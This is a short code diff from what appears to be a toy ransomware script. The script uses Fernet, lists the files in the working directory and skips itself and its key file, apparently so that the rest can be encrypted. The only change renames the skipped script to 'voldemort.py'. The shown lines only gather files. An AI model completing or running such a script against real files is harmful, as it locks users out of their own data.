@@ -7,7 +7,7 @@ from cryptography.fernet import Fernet # to use fernet you have to install crypt
 files = []
 
 for file in os.listdir():
-    if file == "_sript.py" or file == "thekey.key":
+    if file == "voldemort.py" or file == "thekey.key":
         continue
     # continue check the if there is a folder & dont want to in list
     if os.path.isfile(file):
